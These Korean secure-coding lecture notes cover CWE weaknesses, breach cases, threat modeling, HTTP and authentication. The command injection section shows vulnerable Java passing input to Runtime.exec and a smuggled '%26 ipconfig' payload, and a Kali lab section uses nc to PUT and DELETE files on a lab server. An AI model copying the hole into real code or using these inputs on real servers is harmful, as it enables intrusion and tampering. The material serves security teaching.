

# 이론수업

### SDL

* 개발 공정에서 단계가 진행 될 수록 수정비용이 증가한다.
* 이를 예방하기 위해서는 개발 초기단계부터 보안 시스템을 유념하여 개발하는 것이 좋다.



### 방화벽

* 외부의 공격으로부터 조건(정책)에 따라서 부합되는 통신만 허용하는 장비/소프트웨어



### IDS/IPS (침입 탐지 시스템)



### SQL Injection (CWE-89)

* 외부 입력값을 Query 조작 문자열 포함 여부를 검증하지 않고 Query 작성 및 실행에 사용하는 경우, Query의 구조와 의미가 변경되어서 실행 되는 것
* Database 또는 Data에 대해 공격
  * 권한 밖의 데이터를 조회, 수정, 삭제, 생성
* 서버에 대한 공격
  * Database가 동작하는 서버의 제어권을 획득해서 원격으로 서버를 제어
* 메타문자: 어떤 기능에 대해서 특별한 의미와 용도를 가지는 문자
  (SQL: ', #, ;, - ...  /  URL: ?, &, =, ...)



### XSS공격 (Cross-Site Scripting) (CWE-79)

* 공격자가 전달한 스크립트 코드가 사용자 브라우저를 통해 실행되는 것
* 동적인 Web Page에서 스크립트가 실행되면
  * 브라우저에 저장된 또는 PC에 저장된 정보를 탈취하는 것이 가능하여 진다.
  * 가짜 페이지를 만들고 사용자로 부터 정보를 입력하게 만들고, 입력한 정보를 탈취할 수 있다.
  * 원격으로 스크립트가 실행된 PC를 제어 가능할 수 있다.
    (Zombie PC => BeFF)



#### 동적/정적 Web Page

* 정적: 서버에서 정보를 바꾸지 않는 이상 Web Page가 변경되지 않는 것.
  (페이지가 변경되려면 새로운 페이지로 이동하거나, 개발자가 페이지를 수정해야한다.)
  * CGI(Comeon Gateway I) - 
  * 기본적으로 html로 페이지가 만들어지며, Image, CSS, Javascript 등으로 구성되있다.
* 동적: 사용자의 요청에 따라서 다른 내용으로 바뀐다.



### Session, Cookie

* HTTP의 특성인 Stateless으로 인해서 접속을 유지하기 위해 접속유지를 검증하는 것(?)
* 연결이 끊기고 다시 요청을 보냈을 때, 동일한 사용자를 식별하기 위해서 서버는 Client에게  Cookie를 가지게 한다. 이 쿠키와 세션이 한쌍을 이루어 요청과 요청의 관계를 이어준다.

* 네트워크로 전송이 되기 때문에 쉽게 노출되어 있고, 변조가 가능하다.
* 보안성을 강화하기 위해 서버에서는 추가적인 인증을 통해 Session ID를 지정한다.
* Session Hijacking



### 입력값 검증

* 입력 값의 정상 유무 확인하는 과정.

1. 입력화면 - ID/PW는 입력
2. 사용자 입력을 요청 파라미터로 서버에 전달
   http://.../check.jsp?id=...
3. 요청 파라미터로 전달된 값은 서버 내부 처리를 위해서 사용
   Select * from users where id=…..;

###### Command Injection (CWE-78)

* 시스템에 명령을 수행할 수 있는 쉘 환경을 유도

* 운영체제 명령어 실행 부분이 존재하는 경우

* 외부 입력값의 검증 & 제한 없이 운영체제 명령어 실행 부분에 사용되는 경우 발생한다.

  * 외부 입력값을 검증 제한 없이 명령어로 사용하는 경우

    .../doSomething.jsp?cmd=dir : 서버에서 dir한 결과가 반환

    의도하지 않은 명령어가 실행되어 서버의 제어권을 공격자에게 주는 상황이 될 수 있다.

    ```
    String input = request.getParameter("cmd");
    Runtime.getRuntime().exec(input);
    
    .../doSomething.jsp?fname=help.txt : c:\data\help.txt 내용이 화면에 출력
    .../doSomething.jsp?fname=help.txt %26 ipconfig : 의도하지 않은 추가 명령어가 실행된다.
    String input = request.getParameter("fname");
    Runtime.getRuntime().exec("type c:\data\" + input);
    ```


​    

###### Open Redirect (CWE-601)

* 일반 사용자들이 피싱 사이트로 자신도 모르게 접속하게 유도



### 에러 처리

* 이차적인 문제가 발생하지 않도록 해야한다.
* 오류 메시지를 통해 정보가 유출될 수 있다.
* 오류 상황 대응 부재: 서비스가 중단되거나, 시스템이 잘못된 방향으로 동작할 수 있다.
* 부적절한 예외 처리: 오류에 대해 잘못 대응.. 



### 인증 / 인가

* 특징 인증
  * 바이오 인증



### 인가

* 권한 = 접근통제

1. 화면
2. 기능: 처리 전 서버에서 권한을 확인
3. 데이터: 



### Secure Cording

* 구현시 Secure Cording 한다
* 정해진 규칙에 맞추어 개발을 진행한다. (좁은 의미로)
* 소프트웨어 개발 생명주기() 전 단계에 걸쳐 취약점을 가지지 않도록 개발한다. (넓은 의미로)
* 개발자 + 분석가, 설계자, 테스터, 운영자 및 사용자 모두가 각각 직무에 맞는 보안 활동을 수행해야한다.





## IT 시스템에 대한 보안 정책

### 네트워크 보안

* 방화벽: 기본적으로 패킷에 대해 사전에 설정한 접근제어목록에 따라 허용 또는 차단하는 기능
* IDS: 방화벽으로는 탐지할 수 없는 트래픽이나 컴퓨터 사용을 탐지한다.
  호스트 기반의 공격이 발생하면 이벤트를 발생시키고 DB에 기록하거나 사전에 정한 규칙에 따라 보안 이벤트를 이용하여 경고한다.
* IPS: IDS와 유사하지만 허용되지 않은 사용자나 서비스에 대해 사용을 거부하여 내부자원을 보호한다.



### 시스템 보안

* OS와 연관이 많다.
* 주기적으로 시스템 악성코드 점검을 통해 시스템이 안전한 상태로 유지되도록 한다.



### 어플리케이션 보안

* 90% 이상이 잘못 만들어진 어플리케이션으로 보안사고가 발생한다.
* 방화벽, IDS/IPS, 시스템 보안에서 잘 막아가니 그나마 취약한 어플리케이션에서 공격이 이루어 지는 것 같다. (물리보안)



### OWASP 2013 (2017)

* **개발 보안** (내가 안전하게 만드는 것)
* **공급망 관리**
  (공개 API, 프레임워크 같은 다른 사람이 만든것을 사용하는 것에 대해 보증할 수 있도록..)
* 정보보호 사전보안
* 보안강화
  [ 분석 / 설계 / 구현  / 테스트 / 이행 ] - [ 운영 / 유지보수 ]
* 보안 내재화라고도 한다.
  (정보보호 백서 2019에서 보안 내재화를 강조하고 있다.)
* **공공 시스템 뿐만 아니라 민간영역까지 확대하는 중에 있다.**



### ISMS(ISMS-P)

- **정보보호 및 개인정보 보호 관리체계 인증**
  (Personal Information& information Security Management System)
- 운영 / 유지보수
- PIMS+ISMS = ISMSP



#### DRM

* 디지털 권리 관리(Digital Rights Management)





#### DLP

* 데이터 유출 방지(Data Loss Prevention)





## 보안 사고 사례

#### 웹 어플리케이션 취약점 (k* 해킹사례)

고객번호를 조회

search.jsp?고객번호=123

1. 로그인 여부 확인 (인증 여부)
2. 처리에 필요한 정보가 전달되었는지 확인 (요청 파라미터 점검)
3. 파라미터를 가지고 Select.
4. 결과를 반환

결과

1. 일치하면: 고객정보가 출력
2. 일치하지 않으면: 메시지 출력

**문제점!**

1. 특정 직원이 접근 권한이 있는지 체크하지 않는다.
   (데이터에 대한 접근 통제가 이루어지지 않았다.)
   - 모든 사람을 조회할 수 있다. (고객 정보 모두 조회 가능)
   - 애플리케이션에서 (search.jsp) 고객정보 조회 권한을 줘야했다.
2. IDS/IPS를 우회하기 위해 한번에 정보를 검색하지 않고 3초에 1번 1건씩. 1600만번 조회하여 3개월 동안 데이터를 가져감.



#### 웹 서버 취약점 (__k Broad B_nd)

* 파일 업로드
  1. 파일 크기 제한 X - 서버 자원 고갈을 유발. 정상적인 서비스 방해 (=Dos, DDos)
     - 서버의 디스크(Storage) 자원 고갈
     - 업로드, 다운로드 중에 연결이 지속되는 시간이 길어져, 서버 연결자원이 고갈된다.
  2. 파일 종류 제한 X -
     - 서버에서 실행되는 파일을 업로드 - 서버 제어권 탈취
       (SSS(Server Side Script): PHP, JSP, ASP, JS ...)
     - 클라이언트에서 실행 되는 파일을 업로드 - 악성 코드 유포장소로 활동
  3. 해결점
     - 외부 접근 가능 경로에 저장

패스워드

1. 패스워드 생성 규칙
   - 영문 + 숫자 + 특수문자 : 8자리, 10가지 이상. 문자연속x.
     숫자만= 10ⁿ, 영숫특=(24+10+8)ⁿ
   - 사전에 등록된 PW 사용불가
   - 일정한 규칙을 가지지 않도록 한다.
   - 개인의 정보과 연관성이 없도록 한다.
2. 저장(보관)
   - 암호화하여 보관 해야 한다.
     (해쉬 암호화: 어떤 값을 일정한 크기의 유일한 값으로 만든다.)
   - 해쉬: 고정된 길이, 유일한 값. 단방향(일방향)
3. 관리 정책
   - 변경 주기
   - 히스토리 (동일한 비밀번호 다시 사용 자재)
   - 최소 사용 기간



##### 암호화

비도: 보안강도 (비도가 높을 수록 암호문을 가지고 key를 알아내는데 오랜시간이 걸린다.)

수학적으로 암호문이 공개되어도 key값을 알아내기 어려워야 좋은 암호 알고리즘 이라고 한다.

암호 알고리즘, Key, 암호문 3가지를 모두 가지고 있는 관리자(admin)

관리자는 정보를 가져가기 쉽다. 사용자의 PW를 알지 못하도록 단방향을 사용하도록 하였다.



#### 계정 관리 미비, 암호화 정책 미비 (Hyun대 케pi탈)

1. 퇴사한 직원의 계정으로 여전히 접속되어 회원의 개인정보를 탈취
2. 암호화되어 있는 개인정보 DB. 복호화를 위해 어플리케이션의 로그를 탈취



### OpenSSL 하트 블리드 취약점

* OpenSSL: 보안 통신을 지원해주는 라이브러리
* HeartBeat: 클라이언트와 서버 간에 세션연결이 유지되는지 확인하는 기능
* 클라이언트가 보낸 메시지의 길이와 서버에서 처리하는 메시지의 길이를 비교하지 않으면 필요 이상의 정보를 응답하게 된다.



## 보안취약점 정보 활용

* 취약점 DB
  * CWE (Common Weakness Enumeration)
    * 미국 국토안보부에서 관리. http://cwe.mitre.org
    * SW의 취약점을 사전식으로 분류해 쉽게 접근하도록 함.
  * CVE (Common Vulnerabilities Exposures)
    * 일반적인 취약점 노출. http://cve.mitre.org
  * SANS TOP 25
    * 시대가 바뀌면 환경도 바뀐다.
      환경이 바뀌니 오류가 아니였던 것이 오류가 되고, 안전했던 것이 안전해지지 않더라...
    * 구성 요소 간 안전하지 않은 상호작용 (6가지) - 인젝션...
    * 위험한 자원 관리 (8가지) - 버퍼오버플로우
    * 허점이 많은 방어 (11가지)
  * OWESP TOP 10
* Secure Coding Guide
  * CERT
  * 개발보안 가이드
* 방법론
  * MS-SDL
  * 7 Touch Point
  * CLASP



### CSRF (Cross Site Request Forgery) (CWE-352)

* 서버로 전달된 요청을 요청 절차와 주체에 대한 검증을 수행하지 않고 요청을 처리했을 때 발생

## 구성요소 간 안전하지 않은 상호작용

**CWE-89**: [SQL Injection](#SQL Injection (CWE-89))

**CWE-78**: [Command Injection](#Command Injection (CWE-78))

**CWE-79**: [XXS](#XSS공격 (Cross-Site Scripting) (CWE-79))

**CWE-434**: 위험한 유형의 파일 업로드를 제한하지 않은 것

**CWE-352**: 사이트 간 요청 위조 = [CSRF](#CSRF (Cross Site Request Forgery) (CWE-352))

**CWE-601**: 신뢰할 수 없는 사이트로 URL 접속지를 변경 = [Open Redirect](#Open Redirect (CWE-601))

## 위험한 자원 관리

### BoF(Buffer OverFlow) (CWE-120)

**CWE-22**: 특정 디렉토리에 존재하는 파일을 제공하는 서비스 - 파일 다운로드

**CWE-494**: 무결성 검사 없이 코드 다운로드.

**CWE-829**: 신뢰할 수 없는 제어영역에서 온 기능을 포함하는 것

**CWE-676**: 잠재적으로 위험이 있는 함수를 사용하는 것

**CWE-131**: 버터 크기를 잘못 계산

**CWE-134**: 형식 문자열을 통제하지 않음
	Format String: 출력 형식을 지정하는 문자. %s, %c, %n 등..

**CWE-190**:  정수 오버플로우 또는 랩 어라운드



## 방어 미비

입력 -> 처리 -> 결과

입력

1. 신뢰 할 수 있는 곳에서 오는 입력 (서버가 보유한 값 ex. 자기에서 가지고 있는 값)
2. 신뢰하지 못하는 입력 (외부 입력 값 - 사용자 입력)

안전한 처리를 위해서

* (2)을 최소화 한다.
* (2)의 입력을 꼭 필요한 값 만을 수용한다.





CWE-327

​	암호화

1. 안전한 알고리즘 = 일정한 수준을 유지할 수 있는 비도 (비도=Key 길이에 비례)
2. 키 길이 준수
3. 키 보관



## OWASP Top 10 - 2013

A7: 기능 수준의 접근 통제 누락 - 회원가입 페이지에서 게시판 조회기능이 있거나 그런...

A9: 알려진 취약점이 있는 컨포넌트 사용

##### [Exploit Database](http://www.exploit-db.com)





##### [Android Secure Coding Guide](https://www.jssec.org/dl/android_securecoding_en.pdf)





## 소프트웨어 개발보안 가이드

​	[행정안전부 소프트웨어 개발 보안 가이드](https://www.mois.go.kr/frt/bbs/type001/commonSelectBoardArticle.do?bbsId=BBSMSTR_000000000015&nttId=57473)



### 설계단계 보안요구항목



### 소프트웨어 개발보안 방법론

#### [SDL (Secure Development Lifecycle)](#SDL)

|     분석(설계)     |           구현           | 테스트 | 배포(이행) |
| :----------------: | :----------------------: | :----: | :--------: |
| 20개 보안 요구사항 | 47개 보안 약점, 소스코드 |        |            |

요구사항 정의서

1. 정적 쿼리
2. 동적 쿼리 입력값 검증
3. 사용자 권한 Down

추적표



##### 소프트웨어 개발 단계별 보안 활동

|       요구사항 분석       |                           설계                            |                        구현                         |                   테스트                   |
| :-----------------------: | :-------------------------------------------------------: | :-------------------------------------------------: | :----------------------------------------: |
| 요구사항 중 보안항목 식별 | 보안 요구사항과 위협에 대한 보안통제를 고려해 위협원 도울 | 표준 코딩 정의서 및 SW개발보안 가이드를 준비해 개발 |         실행 코드 보안취약점 진단          |
|                           |                   외부 인터페이스 식별                    |          소스코드 보안약점 진단(도구 활용)          | (동적 분석: 스캐닝, 모의 침투 테스트 등..) |
|                           |                      보안 통제 수립                       |                                                     |                                            |



* 정적 - 소스코드(White Box)
  * 형태, 문법(구문), 내용 (=코드리뷰)
* 동적 - 실행 파일(Black Box)
  * 결과(값, 성능, 보안) (=디버깅, 부하 테스트, 모의 해킹(침투테스트))



* 약점(Weakness): 보안 취약점의 근본적인 원인이 될 수 있는 결함, 실수, 버그 등의 오류
* 취약점(Vulnerability): 외부 공격으로 시스템의 보안정책을 침해하는 시스템 상의 허점



##### 개발보안 비용 효과

| 구분           | 설계단계 | 코딩단계 | 통합단계 | 베타제품 | 제품출시 |
| -------------- | -------- | -------- | -------- | -------- | -------- |
| 설계과정 결함  | 1배      | 5배      | 10배     | 15배     | 30배     |
| 코딩 과정 결함 |          | 1배      | 10배     | 20배     | 30배     |
| 통합 과정 결함 |          |          | 1배      | 10배     | 20배     |



![img](https://lh5.googleusercontent.com/5qqpIqjJSXiuBrDbjQvW3UqnAWkjXdgFe2uMK8JD65yMg1dehnarxVHXeWtTfhnx3F8W2Ax6NDKwFWZMuYQWw9b0Duy27EB-mTf5dKGLHMs4YxLRJJ2mc2NOaxtK8MMzT1gtIClV)



#### MS-SDL(Microsoft SDL)

MS에서는 보안 수준이 높은 소프트웨어를 개발하기 위해 다음 3가지 요소가 필요하다고 정의한다.

1. 반복 가능한 프로세스
2. 엔지니어 교육
3. 측정 기준 및 책임성



| 1. 교육                                           | 2. 계획/분석                                                 | 3. 설계                                       | 4. 구현                                               | 5. 시험/검증                                                 | 6. 배포/운영                                | 7. 대응                                  |
| ------------------------------------------------- | ------------------------------------------------------------ | --------------------------------------------- | ----------------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------- | ---------------------------------------- |
| **소프트웨어 개발 보안교육<br />(Core Training)** | 소프트웨어의 질과 버그 경계 정의<br />(Define Quality Gates / Bug bar) | 공격 영역 분석<br />(Attack surface analysis) | 도구 명세<br />(Specify Tool)                         | 동적/퍼징 테스팅<br />(Dynamic/Fuzz Testing)                 | 사고 대응 계획<br />(Reasponse Plan)        | 사고 대응 수행<br />(Response execution) |
|                                                   | 보안과 프라이버시 위협 분석<br />(Analyze Security and Privary Risk) | **위협 모델링<br />(Threat Modeling)**        | 금지된 함수 사용 제한<br />(Enforce Banned Functions) | 공격 영역/위협 모델 검증<br />(Verify Threat Models/Attack Surface) | 최종 보안 검토<br />(Final Security review) |                                          |
|                                                   |                                                              |                                               | **정적 분석<br />(Static Analysis)**                  |                                                              | 기록 보관 (Release Archive)                 |                                          |

[MS-SDL 자세한 정보](https://www.microsoft.com/en-us/securityengineering/sdl)





##### 위험 모델링 (Threat Modeling)

* "어떤 위협이 있을까"에 집중해야 한다. "위협을 어떻게 처리해야 할까"는 목적에 맞지 않는다.
* 위협을 파악하고, 어떻게 대응할 수 있는지 결정하여 방법을 제공하는 것.
  (위협만 파악되면 대응법은 제공할 시스템이 되어있다는 말(?))
* 모델링 단계
  1. 팀소집 - 리더, 구성원 (10명 내외). 리더는 코딩능력은 부족해도 침해대응 능력이 탁월해야 한다.
  2. 어플리케이션 분해 - 구조화된 다이어그램(도식화)으로 표현한다. DFD(데이터 흐름도) 사용을 권장한다.
     * **두리뭉실한 문제점들을 그림화하여 시스템(문제점)을 잘 이해하도록 한다.**
     * 서비스 하나의 프로세스로 보고 상호작용을 확인하기 위한 배경도를 그린다.
     * 어플리케이션 분해 레벨에 따라 상세정보를 기술한다.
     * 서술되는 세부사항 하나하나가 공격목표가 될 수 있어 위협이 될 수 있는 목표를 식별할 수 있다.
  3. 위협 결정 - 위협을 식별하고 위협을 분류(STRIDE)한다. 위협트리 생성
  4. 우선순위 결정 - 할당된 자원을 효율적으로  사용하기 위해서 결정한다.
     - DREAD를 통해 위험도를 산정하고 산정한 위험도를 가지고 우선순위를 결정한다.
  5. 대응기법 방법
     1. 무시 (ignore)
     2. 알림 (Alert) - 안전하지 않다.
        - 사용자에게 알리는 것은 위협을 전가시키는 행위가 된다
     3. 제거 (Remove)
        - 위협이 되는 기능(서비스)을 없애버리게 된다. 
     4. 수정 (Fix)
        - 기능을 살리고 위협을 없앤다.
        - 추가적인 비용(시간, 물질, 인력 등)이 들어갈 수 있다.
  6. 대응할 기법 기술 선택
     - 위험 결정에서 분류한 것을 토대로 기법과 기술을 선택한다.



##### Seven Touchpoint



##### OWASP CLASP

* 활동 중심, 역할 중심의 프로세스로 구성된 집합 - 프로젝트를 진행하는데 역할(Role)을 구조화
* 5개의 뷰로 구성
  1. Concept View (Ⅰ)
     - CLASP 정의
     - 적용 사례
  2. Role-Based View (Ⅱ)
     - 프로젝트를 진행할 때 개별 구성원(Role)의 역할을 정의 (PM, Programer, Desinger ...)
  3. Activity-Assessment View (Ⅲ)
  4. Activity-Implementation View (Ⅳ)
     - 구성원 역할에 관한 활동을 정의
     - 보안 강화 활동 24가지 정의
     - 타당성 근거 및 비용 산정 근거
  5. Vulnerability View (Ⅴ)
     - 104개의 취약점에 대한 설명 (개발자에게 알림)
* [CLASP Concepts (참고)](https://www.owasp.org/index.php/CLASP_Concepts)



#### Hash 버전

- MD5는 사용 X (벌써 깨졌음)
- SHA버전 중 SHA-2(256,224) 이상으로. 곧 2도 깨질거같음.
  [SHA 위키백과](https://ko.wikipedia.org/wiki/SHA)



## 웹 어플리케이션 보안을 위한 기본 지식

#### Proxy

* 네트워크 패킷을 캐싱하여 준다.
* 캐싱된 패킷을 가지고 요청/응답에 대해 모니터링과 분석을 할 수 있다.
* N/W설정을 통해 Proxy 연동 사용



### HTTP와 웹 구조

* Stateless= ConnectionLess (연결유지 X)
  (¹연결 후 ²요청/응답. 응답완료 후 ³연결해제)
* 요청이 있어야 응답을 한다.
* 최초 문서를 공유하기 위해 구현된 네트워크.
* 문서를 제공하기 위해 구축 하다보니 Stateless구조로 구현이 되었다.
* 현재는 서버의 구조는 모듈(Mutable)구조를 갖는다.



[Spring MVC 프레임워크 처리 구조](https://zetawiki.com/wiki/스프링_MVC_처리구조)

![img](http://pic002.cnblogs.com/images/2012/93867/2012101109363253.jpg)



시작: Method _ URI _ HTTP.1.0  _ 200 _ OK 

* Method Type: **GET**, **POST**, OPTIONS, HEAD, PUT, DELETE
* HTTP 응답 상태 코드

| 상태코드 |               설명                |
| :------: | :-------------------------------: |
|   1xx    |           정보를 제공함           |
|   2xx    |     요청이 성공적으로 이뤄짐      |
|   3xx    | 요청한 해당 자원이 다른 곳에 있음 |
|   4xx    |        요청에 문제가 있음         |
|   5xx    |        서버에 에러가 있음         |



헤더: Content-Type 

​		Content-Length

​		Referer, Cookie

​	

##### nc를 이용한 HTTP 메소드 테스트

nc KALI#1_IP 80↳ ⇐ 웹서버에 연결

GET / HTTP/1.0↳  ⇐ 요청 시작

↳            				 ⇐ 요청 헤더의 끝



```
root@kali:~# nc 192.168.49.128 80 ⇐ 연결
GET / HTTP/1.0 ⇐ 요청 시작
 ⇐ 요청 헤더 끝
HTTP/1.1 200 OK ⇐ 응답 시작 
Date: Wed, 24 Jul 2019 07:31:17 GMT ⇐ 응답 헤더
Server: Apache/2.4.23 (Debian)
Set-Cookie: PHPSESSID=lchio2qconjrv4p74cksmp4mp4; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 498
Connection: close
Content-Type: text/html; charset=UTF-8
 ⇐ 응답 헤더 끝
<html> ⇐ 응답 본문
<body>
	<form action="login.php" method="post">
	Username : <input type="text" name="username" size="10" required />
	Password : <input type="password" name="password" size="10" required />
	<input type="submit" name="login" value="Login" />
	</form>
	<br/>
	<table width="580" border="1" cellpadding="2" style="border-collapse:collapse">
	<tr>
		<th width="30">number</th>
		<th width="300">title</th>
		<th width="50">name</th>
		<th width="60">date</th>	
	</tr>
	</table>
</body>
</html>

root@kali:~#
```

* openeg 사이트에서 제공하는 메소드 목록을 확인

  ```
  root@kali:~# nc 192.168.49.1 8080↳ ⇐ 연결
  OPTIONS / HTTP/1.0↳ ⇐ 요청
  ↳
  HTTP/1.1 200 OK ⇐ 응답
  Server: Apache-Coyote/1.1
  Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS ⇐ 해당 서버는 6개의 메소드를 제공한다.
  Content-Length: 0
  Date: Wed, 24 Jul 2019 07:35:23 GMT
  Connection: close
  
  root@kali:~#
  ```

  

* openeg 사이트에 GET 방식의 요청과 HEAD 방식의 요청 결과를 비교

  ```
  root@kali:~# nc 192.168.49.1 8080↳ ⇐ 연결
  GET /openeg/login.do HTTP/1.0↳ ⇐ GET 방식의 요청
  
  HTTP/1.1 200 OK ⇐ GET 방식 요청에 대한 응답
  Server: Apache-Coyote/1.1                                          ⇐ 응답 헤더
  Set-Cookie: JSESSIONID=055EE06171EA9E955B76BADA20863367; Path=/openeg
  Content-Type: text/html;charset=UTF-8
  Content-Language: ko-KR
  Content-Length: 3681
  Date: Wed, 24 Jul 2019 07:39:52 GMT
  Connection: close                                                  
                                                                     ⇐ 응답 헤더의 끝
  ⇐ 응답 본문의 시작
  
  
  
  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
  <html>
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>Login</title>
  <link href="/openeg/css/main.css" rel="stylesheet"
  	type="text/css">
           :
  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
  		    <div id="aside">
  				
  				
  				<form action="login.do" method="post">
  					<fieldset>
  						<center>
  							<label for="userId">메일주소 : </label> <input type="text"
  								id="userId" name="userId" class="loginInput" value="" />
  							<span class="error"></span><br />
  							<label for="userPw">비밀번호 : </label> <input type="password"
  								id="userPw" name="userPw" class="loginInput" /> <span
  								class="error"></span><br />
  							<br /> <input type="submit" value="로그인" class="submitBt" /> <input
  								type="button" value="회원가입" class="submitBt"
  								onClick='window.open("member/join.do","_blank","width=400,height=400, toolbar=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no");' />
  						</center>
  					</fieldset>
  				</form>		    </div>
  			<div id="footer">
                                 :
  </body>
  </html>⇐ 응답 본문의 끝
  
  root@kali:~# nc 192.168.49.1 8080↳ ⇐ 연결
  HEAD /openeg/login.do HTTP/1.0↳ ⇐ HEAD 방식의 요청
  
  HTTP/1.1 200 OK ⇐ HEAD 방식 요청 결과
  Server: Apache-Coyote/1.1                                              ⇐ 응답 헤더
  Set-Cookie: JSESSIONID=170194BCC4622C98AB74D7AC810A7371; Path=/openeg
  Content-Type: text/html;charset=UTF-8
  Content-Language: ko-KR
  Content-Length: 3681
  Date: Wed, 24 Jul 2019 07:40:13 GMT
  Connection: close
                                                                        ⇐ 응답 헤더 끝
  ```

* openeg 사이트에 PUT 메소드를 이용해서 자원을 생성

  ```
  root@kali:~# nc 192.168.49.1 8080
  PUT /hello.html HTTP/1.0
  Content-Type: text/html
  Content-Length: 42
  
  <html><body>Hello, World!!!</body></html>
  HTTP/1.1 403 Forbidden
  Server: Apache-Coyote/1.1
  Content-Type: text/html;charset=utf-8
  Content-Length: 964
  Date: Wed, 24 Jul 2019 07:54:02 GMT
  Connection: close
  
  <html><head><title>Apache Tomcat/6.0.24 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 403 - </h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u></u></p><p><b>description</b> <u>Access to the specified resource () has been forbidden.</u></p><HR size="1" noshade="noshade"><h3>Apache 
  
  root@kali:~#
  ```

* **Q1.** Kali#2에서 HTTP 메소드를 이용해서 openeg 사이트의 hello.html 파일을 삭제해 보세요.

  ```
  root@kali:~# nc 192.168.111.1 8080
  DELETE /hello.html HTTP/1.0
  
  HTTP/1.1 204 No Content
  Server: Apache-Coyote/1.1
  Date: Wed, 24 Jul 2019 08:26:03 GMT
  Connection: close
  root@kali:~#
  ```

* **Q2.** Kali#2에서 HTTP PUT 메소드를 이용해서 openeg 사이트의 hello.html 파일을 2번 생성해 보세요.

  ```
  root@kali:~# nc 192.168.111.1 8080
  PUT /hello.html HTTP/1.0
  Content-Type: text/html
  Content-Length: 42
  
  <html><body>Hello, World!!!</body></html>
  HTTP/1.1 201 Created
  Server: Apache-Coyote/1.1
  Content-Length: 0
  Date: Wed, 24 Jul 2019 08:28:09 GMT
  Connection: close
  
  root@kali:~# nc 192.168.111.1 8080
  PUT /hello.html HTTP/1.0
  Content-Type: text/html
  Content-Length: 42
  
  <html><body>Hello, World!!!</body></html>
  HTTP/1.1 204 No Content
  Server: Apache-Coyote/1.1
  Date: Wed, 24 Jul 2019 08:28:14 GMT
  Connection: close
  
  root@kali:~# nc 192.168.111.1 8080
  PUT /hello.html HTTP/1.0
  Content-Type: text/html
  Content-Length: 42
  
  <html><body> WOW WOO WO helaksjdawlkj</body></html>
  HTTP/1.1 204 No Content
  Server: Apache-Coyote/1.1
  Date: Wed, 24 Jul 2019 08:37:49 GMT
  Connection: close
  
  root@kali:~#
  ```



### 인증과 인가



#### 인증방식

| 인증방식               | 설명                                                         |
| ---------------------- | ------------------------------------------------------------ |
| Type.1 (인식기반)      | 자신이 알고 있는 것으로 인증한다.<br />Ex) 패스워드, 일회용 패스워드(OTP), 개인식별번호(PIN) |
| Type.2 (소유기반)      | 자신이 가지고 있는 것으로 인증한다.<br />Ex) 메모리카드, 스마트카드, 마그네틱카드 |
| Type.3 (신체 특징기반) | 사용자의 고유 특징으로 인증한다.<br />Ex) 홍채, 지문, 정맥, 음성, 서명(필체) |



#### 인가를 위한 접근 통제 기술

| 접근통제 기술                                                | 설명                                                         |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| [접근제어목록]([https://ko.wikipedia.org/wiki/%EC%A0%91%EA%B7%BC_%EC%A0%9C%EC%96%B4_%EB%AA%A9%EB%A1%9D](https://ko.wikipedia.org/wiki/접근_제어_목록))<br />(ACL: Access Control List) | 사용자, 자원 중심의 목록을 작성하여 목록에 비교하여 접근 통제 |
| 접근통제표<br />(ACM: Access Control Matrix)                 | 자원 중심의 접근통제 표를 작성하여 접근 통제                 |
| 강제적 접근통제<br />(MAC: Mandatory Access Control)         | 사용자와 자원에 적절한 보안등급(레이블)을 부여하여 통제      |
| 역할기반 접근통제<br />(RBAC: Role Base Access Control)      | 사용자에게 역할(Role)을 부여하고 각 역할 별로 권한을 부여.   |



접근 통제표(ACM)

![img](https://lh5.googleusercontent.com/WzmQpiRwn43KEAjrvn5Y86zA4uT7kEdnsvvk-gCcUmY1CPBkHtvXZitAkx_PY9ECGl_fHofcZPvbsajoPtHmkWLAiOlWOmnPNqgwI0p1dzgzs1KGHXhqUXZkmzxmEnqUAORNtLhS)





#### 웹 인증 방식

* 세션을 사용하지 않는 HTTP 인증
  * Basic Authentication
    * Base64 인코딩 방식사용.
    * 스니핑을 통해 정보가 유출될 (매우) 위험이 높다.
  * HTTP Digest Authentication
    * 패스워드 없이 로그인 요청을 하고 요청마다 달라지는 랜덤한 수를 클라이언트에 전달하여 패스워드와 함께 MD5로 해시해서 서버에 다시 전달한다.
  * HTTP NTLM Authentication
  * Anonymous Authentication
* 세션을 사용하는 인증
  * Form Based Authentication
    * Form태그를 이용해 인증정보를 서버에 전달하는 방식
    * 데이터는 평문으로 전송되기  때문에 정보가 유출되지 않기 위해 SSL을 이용한 구간 암호화 통신 방식을 이용한다.

##### SSL(Secure Socket Layer)



### 세션과 쿠키



##### 쿠키

* 서버가 클라이언트에게 부여하는 요청과 요청 간에 관계를 이어주기 위한 흔적(?)이다

* 설정 항목 (속성)

  * Name, Domain, Path
  * Expires: 유효기간, 지속시간(Maxage)
    * 파일형태로 디스크에 저장된다.
      (DiskCookie, 영속 쿠키 ↔ Memory Cookie, 비영속 쿠키)
  * Secure: 보안속성. HTTPS 요청으로만 전송되게 된다.
  * [**HttpOnly**](#): Javascript로 직접 접근할 수 없음 (모든 브라우저가 지원하지 않음)

* WebStorage: 모바일 환경에서 서비스를 원활하게 하도록 하기 위해...
  임시적으로 저장되었다가 전송되고 난 후 사라지는 Session Storage
